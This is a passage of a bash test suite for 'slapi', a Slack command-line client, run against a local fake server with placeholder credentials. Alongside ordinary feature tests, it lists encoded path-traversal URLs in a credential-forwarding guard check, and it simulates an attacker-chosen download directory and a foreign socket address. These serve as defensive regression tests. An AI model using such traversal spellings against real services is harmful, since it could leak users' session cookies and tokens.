fresh_unit() { HOME="$T" SLAPI_UNDER_TEST="$SLAPI" bash -c 'source "$SLAPI_UNDER_TEST"; fresh /nonexistent/file; echo "rc=$?"' harness 2>&1; }
check "a cache file that vanished reads as stale, quietly" equals "$(fresh_unit)" "rc=1"

###
echo "-- watch: your own actions, filters, reconnects"
# watch runs until stopped, so every run here is bounded by timeout (which takes the whole process group)
watch_run() {
  local secs="$1"
  shift
  touch "$W/rtm-reset"
  timeout "$secs" env PATH="$NODE_DIR:$PATH" HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" watch "$@"
}
ws_connections() { jq --slurp 'map(select(.ws == true and .authed == true)) | length' "$LOG"; }

before=$(ws_connections)
out=$(watch_run 5 2>"$ERR")
check "watch shows a message from someone else, in its channel" contains "$out" "=== Message from alice (UAAAAAAA1) in #general at"
check "and resolves mentions in it" contains "$out" "hello from alice @dung"
check "your own message is tagged (you)" contains "$out" "=== Message from dung (you) (UAAAAAAA9) in #general at"
check "a thread reply says how to open its thread" contains "$out" "(a reply in a thread, slapi thread C0000001A 1790000300.000100)"
check "your reaction is tagged and shows the message it is on" contains "$out" "dung (you) added :eyes: in #general on a message by Bob B: > quoted & @alice ping"
check "someone else removing a reaction is shown" contains "$out" "alice removed :thumbsup: in #general"
check "a reaction on another message is shown too" contains "$out" "alice added :tada: in #general"
check "a reaction on a thread reply is not pinned on the wrong message" equals "$(grep --count 'alice added :rocket: in #general$' <<<"$out")" "1"
check "a shared file shows its name and how to fetch it" contains "$out" "alice shared file F0000000001 shot one.png (image/png, 171 KB) in #general  [slapi file F0000000001]"
check "an edit of yours is shown as one" contains "$out" "Edited message from dung (you)"
check "and carries its new text" contains "$out" "my reply, edited"
check "a delete is shown with what it removed" contains "$out" "message deleted in #general (was from dung (you): my reply, edited)"
check "a message in another conversation is shown by default" contains "$out" "private chatter"
check "typing indicators are hidden by default" lacks "$out" "is typing"
check "read markers are hidden by default" lacks "$out" "read up to"
check "a thread-parent update is not shown as a message" lacks "$out" "reply_count"
check "hostile text in an event is cleaned" clean "$out"
check "the dropped socket is reconnected" contains "$(cat "$ERR")" "reconnecting"
check "and events after the reconnect arrive" contains "$out" "after reconnect"
check "the socket was opened twice, with the cookie and the origin" equals "$(($(ws_connections) - before))" "2"

out=$(watch_run 4 --only-me 2>/dev/null)
check "--only-me keeps your own message" contains "$out" "my reply"
check "--only-me keeps your own reaction" contains "$out" "dung (you) added :eyes:"
check "--only-me drops other people's messages" lacks "$out" "hello from alice"
out=$(watch_run 4 --others 2>/dev/null)
check "--others drops what you did" lacks "$out" "my reply"
check "--others keeps other people's messages" contains "$out" "hello from alice"
out=$(watch_run 4 general 2>/dev/null)
check "naming a conversation limits watch to it" lacks "$out" "private chatter"
check "and still shows that conversation" contains "$out" "hello from alice"
out=$(watch_run 4 --events marked,typing 2>/dev/null)
check "--events marked shows your read markers as yours" contains "$out" "you read up to"
check "--events typing shows typing" contains "$out" "alice is typing in #general"
check "and only what was asked for" lacks "$out" "hello from alice"
out=$(watch_run 4 --concise 2>/dev/null)
check "--concise prints a message as one line" contains "$out" "#general alice: hello from alice @dung"
check "and tags your own line" contains "$out" "#general dung (you): my reply"
out=$(watch_run 4 --json 2>/dev/null)
check "--json prints the raw events" contains "$out" '"type": "reaction_added"'
check "--json is one JSON object per line" equals "$(printf '%s\n' "$out" | jq --slurp 'map(type == "object") | all')" "true"

run watch --only-me --others >/dev/null 2>&1
check "--only-me with --others is refused" equals "$?" "1"
check "an unknown event kind is refused" contains "$(run watch --events bogus 2>&1)" "--events is a comma list"
before=$(ws_connections)
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-badurl timeout 6 "$SLAPI" watch 2>&1)
check "a socket address that is not Slack's is refused" contains "$out" "unexpected socket address"
check "and nothing connected to it" equals "$(($(ws_connections) - before))" "0"

###
echo "-- times, flags, guard spellings, failed pages, downloads age"
for t in 2026 12 1790000300000; do
  check "a bare number is not a time: --oldest $t" contains "$(run read general --oldest $t 2>&1)" "cannot parse time for --oldest"
done
run read general --oldest 20260920 >/dev/null 2>&1
check "but a YYYYMMDD date still is" equals "$?" "0"
check "--public and --types together are refused" contains "$(run search term --public --types im 2>&1)" "--public and --types both choose the channel types"

for u in 'https://files.slack.com/files-pri/x/%2f../api/users.list' 'https://files.slack.com/files-pri/x/%2F..%2Fapi' 'https://files.slack.com/files-pri/x%5c..%5capi' 'https://files.slack.com/files-pri/x\..\api'; do
  check "guard: no credentials to the spelling $u" unguarded "$u"
done
check "guard: an ordinary encoded file name still gets them" guard 'https://files.slack.com/files-pri/T1-F1/shot%20one.png'

out=$(HOME="$W/home12" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-noarray "$SLAPI" channels 2>&1)
check "a page without the expected list is a failure" contains "$out" "jq"
check "and nothing half-empty is cached" equals "$(find "$W/home12/.cache" -name 'users*' 2>/dev/null | wc --lines)" "0"

check "a permalink with a newline stays on one line in concise search" equals "$(run search nlperma --concise 2>/dev/null | wc --lines)" "1"

mkdir --parents "$T/.cache/slapi/files"
: >"$T/.cache/slapi/files/old-download.png"
: >"$T/.cache/slapi/files/new-download.png"
touch --date '40 days ago' "$T/.cache/slapi/files/old-download.png"
run whoami >/dev/null 2>&1
check "a download older than a month is removed" [ ! -e "$T/.cache/slapi/files/old-download.png" ]
check "a recent one is kept" [ -e "$T/.cache/slapi/files/new-download.png" ]
rm --force "$T/.cache/slapi/files/new-download.png"

###
echo "-- watch does not outlive its shell"
touch "$W/rtm-reset"
SLAPI_UNDER_TEST="$SLAPI" PIDFILE="$W/node.pid" CFG="{\"url\":\"ws://127.0.0.1:$PORT/rtm\",\"cookie\":\"xoxd-fake%2Bcookie\"}" PATH="$NODE_DIR:$PATH" bash -c '
  source "$SLAPI_UNDER_TEST"
  printf "%s\n" "$CFG" | node -e "$PUMP_JS" >/dev/null &
  echo $! >"$PIDFILE"
  wait' &
parent=$!
sleep 1.5
node_pid=$(cat "$W/node.pid")
check "the socket client is running while its shell is" kill -0 "$node_pid"
kill -9 "$parent"
sleep 4
check "and it exits by itself once that shell is killed" [ ! -d "/proc/$node_pid" ]
kill "$node_pid" 2>/dev/null

###
echo "-- no browser (a sandbox)"
out=$(bare read general 2>&1)
check "with no Chrome profile the error says so, not a traceback" contains "$out" "no Chrome profile at"
check "and names the way out" contains "$out" "set SLAPI_D_COOKIE and SLAPI_XOXC, or run slapi outside it"
check "and the cookie tool was never run" lacks "$out" "Traceback"

###
echo "-- relay delegation (a sandbox wired to hostrelay)"
mkdir --parents "$W/relayhome/.cache/hostrelay/slack/requests" "$W/relayshim"
cat >"$W/relayshim/hostrelay" <<'SH'
#!/usr/bin/env bash
printf '%s\n' "$@" >"$HOSTRELAY_SHIM_LOG"
echo "DELEGATED-OUTPUT"
exit 17
SH
chmod +x "$W/relayshim/hostrelay"
relay_run() {
  HOME="$W/relayhome" PATH="$W/relayshim:$PATH" HOSTRELAY_SHIM_LOG="$W/relay-shim.log" \
    env --unset SLAPI_XOXC --unset SLAPI_D_COOKIE --unset SLAPI_BASE_URL "$SLAPI" "$@"
}

out=$(relay_run read general --limit 5)
rc=$?
check "a box wired to a relay delegates instead of erroring locally" equals "$out" "DELEGATED-OUTPUT"
check "and its own exit code is the relay's, via exec, not a wrapped subprocess" equals "$rc" "17"
check "delegates with the exact original command line" equals "$(cat "$W/relay-shim.log")" "$(printf 'call\nslack\n--\nread\ngeneral\n--limit\n5\n')"

: >"$W/relay-shim.log"
relay_run refresh >/dev/null 2>&1
check "refresh is relay-aware too, not handled locally before the check" contains "$(cat "$W/relay-shim.log")" "refresh"

check "with no relay directory either, the original no-Chrome error still shows" contains "$(bare read general 2>&1)" "no Chrome profile at"
check "and does not try to delegate" [ ! -e "$W/relayshim/ran-without-relay-dir" ]

###
echo "-- relay hardening: --out is pinned when running as the relay's target"
# is_slack_file_url only accepts a real files.slack.com host, so exercising an
# actual download against the fake server needs the same override the existing
# download tests already use (sourced(), defined further down but already in
# scope here since bash reads the whole script before running any of it).
mkdir --parents "$W/attacker-dir"
out=$(HOSTRELAY_SERVICE=slack sourced x F0000000001 --out "$W/attacker-dir" 2>&1)
check "an --out under the relay is ignored, not honored" lacks "$out" "$W/attacker-dir"
check "the file lands in the normal fixed download directory instead" contains "$out" "$T/.cache/slapi/files/F0000000001"
check "and nothing was written to the attacker-chosen directory" equals "$(find "$W/attacker-dir" -type f | wc --lines)" "0"
rm --force "$T/.cache/slapi/files/F0000000001-shot_one.png"
out=$(sourced x F0000000001 --out "$W/attacker-dir" 2>&1)
check "outside the relay, --out still works normally, as a human on the host would expect" contains "$out" "$W/attacker-dir/F0000000001"
rm --recursive --force "$W/attacker-dir"

###
echo "-- error/attachment detail rendering"
out=$(run read quirks)
check "an attachment author_name names a legacy bot" contains "$out" "=== Message from Alertbot (B7)"
check "an attachment footer is a fallback, prefixed via" contains "$out" "=== Message from via Grafana v1.0 (B8)"
next_line_after() { sed --quiet "/$2/{n;p;}" <<<"$1"; }
check "an empty-text bot post has no blank body line before Attachments" equals "$(next_line_after "$out" 'Message TS: 1784000970.000100')" "Attachments:"
check "a real title is used, not a squashed fallback duplicate" contains "$out" "  - build failed"
check "attachment text is not truncated past 1000 characters" contains "$out" "line 61, the actual cause"
check "fields render as title: value, with mentions resolved" contains "$out" "    Branch: main"
check "and a mention inside a field value resolves" contains "$out" "    Commit: @alice"
check "no title and only text: fallback is not shown as a duplicate header" lacks "$out" "a squashed one line summary of the same thing"
check "and the real text still renders" contains "$out" "    a squashed one line summary"
check "that attachment's header is the generic placeholder, not fallback" contains "$out" "  - attachment"

###
echo "-- threads view"
out=$(run threads)
check "threads: header counts shown and unread" contains "$out" "# Threads (2 shown, 2 unread replies, 1 new)"
check "threads: a thread names its channel and starter" contains "$out" "=== Thread in #general, started by alice at"
check "threads: reply count and unread flag" contains "$out" "3 replies, latest"
check "threads: unread is flagged" contains "$out" "(unread)"
check "threads: a read thread is not flagged unread" [ "$(sed --quiet '/started by dung (you)/,/^$/p' <<<"$out" | grep --count 'unread')" = "0" ]
check "threads: the latest reply is shown" contains "$out" "Latest reply from dung (you): looking now"
check "threads: opens with the exact thread command" contains "$out" "Open: slapi thread C0000001A 1790600100.000100"

out=$(run threads --unread)
check "--unread keeps the unread thread" contains "$out" "started by alice"
check "--unread drops the read one" lacks "$out" "started by dung (you)"

out=$(run threads --concise)
check "concise: one line, channel and reply count" contains "$out" "#general 3 replies (unread) alice: deploy is stuck"
check "concise: no header block" lacks "$out" "# Threads"

run threads secret >/dev/null 2>&1
check "threads <chan> resolves the channel first" equals "$?" "0"
out=$(run threads secret)
check "threads <chan> keeps only that channel's thread" contains "$out" "started by dung (you)"
check "threads <chan> drops the other channel's thread" lacks "$out" "started by alice"

out=$(run threads --limit 1)
check "--limit caps how many are shown" contains "$out" "(1 shown"

check "threads is in the top-level list" contains "$(bare help)" "threads"
check "threads has its own help" contains "$(bare help threads)" "slapi threads"
check "threads --help works" equals "$(bare threads --help 2>&1)" "$(bare help threads)"
run threads --bogus >/dev/null 2>&1
check "threads rejects a flag it does not take" equals "$?" "1"

###
echo "-- threads --changed: local checkpoint, never Slack's own read state"
state_file=$(find "$T/.cache/slapi" -name thread-state.json 2>/dev/null)
[[ -n "$state_file" ]] && rm --force "$state_file"
rm --force "$W/bump-thread-0"
check "plain threads never creates a tracking dir" equals "$(find "$T/.cache/slapi" -name thread-state.json 2>/dev/null | wc --lines)" "0"

out=$(run threads --changed)
check "first --changed run is silent: nothing was tracked to compare against yet" equals "$out" ""
check "and exits 0" equals "$?" "0"
check "but it does write a baseline" [ -n "$(find "$T/.cache/slapi" -name thread-state.json 2>/dev/null)" ]

out=$(run threads --changed)
check "immediate rerun is silent too: nothing changed since the baseline" equals "$out" ""

touch "$W/bump-thread-0" # simulate a reply landing on the thread the "alice" fixture started
out=$(run threads --changed)
check "a real reply is detected and shown" contains "$out" "# Threads with new replies since you last checked (1)"
check "shows only the thread that actually changed" contains "$out" "started by alice"
check "not the one that did not" lacks "$out" "started by dung (you)"
check "shows the new reply" contains "$out" "Latest reply from Bob B: someone picked this up"

out=$(run threads --changed)
check "once seen, the same reply is not reported again (someone picked it up, stop tracking it)" equals "$out" ""

out=$(run threads --unread --changed)
check "--unread and --changed compose: still silent, nothing changed since the last --changed check" equals "$out" ""

out=$(run threads --changed --concise)
check "--changed --concise: silent too, not an empty header" equals "$out" ""

before=$(find "$T/.cache/slapi" -name thread-state.json)
run refresh
after=$(find "$T/.cache/slapi" -name thread-state.json)
check "refresh does not wipe the tracking checkpoint" equals "$after" "$before"
rm --force "$W/bump-thread-0" "$after"

###
echo "-- cache isolation"
T2="$W/home2"
mkdir --parents "$T2"
pids=()
for i in 1 2 3 4 5 6; do
  HOME="$T2" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 \
    "$SLAPI" search-users carol >"$W/par$i.out" 2>&1 &
  pids+=($!)
done
wait "${pids[@]}"
ok_runs=0
for i in 1 2 3 4 5 6; do
  grep --quiet 'Name: carol.c' "$W/par$i.out" && ok_runs=$((ok_runs + 1))
done
check "parallel cold-cache runs all succeed" equals "$ok_runs" "6"
before=$(count_calls auth.test)
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-other-2 "$SLAPI" whoami 2>&1)
check "another token does not reuse the cached identity" contains "$out" "auth.test: not_authed"
check "another token goes to the API" equals "$(count_calls auth.test)" "$((before + 1))"


echo "----"
echo "pass=$pass fail=$fail"
[[ $fail -eq 0 ]]
